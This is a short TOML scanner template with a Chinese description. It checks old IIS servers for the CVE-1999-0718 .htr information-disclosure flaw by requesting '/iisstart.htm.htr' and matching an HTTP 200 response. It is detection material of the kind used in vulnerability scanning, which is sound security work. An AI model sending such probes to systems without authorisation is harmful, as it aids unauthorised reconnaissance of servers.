[info]
author = "ave"
description = "验证目标 IIS 服务器是否存在 .htr 映射导致的信息泄露，通过请求 .htr 路径确认是否返回非常规响应。"
id = "POC-AVE-1999-0317"
name = "CVE-1999-0718 PoC"
severity = "medium"
tags = ["cve-1999-0718"]
vuln_id = [
    "CVE-1999-0718",
    "AVE-1999-0317",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/iisstart.htm.htr"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
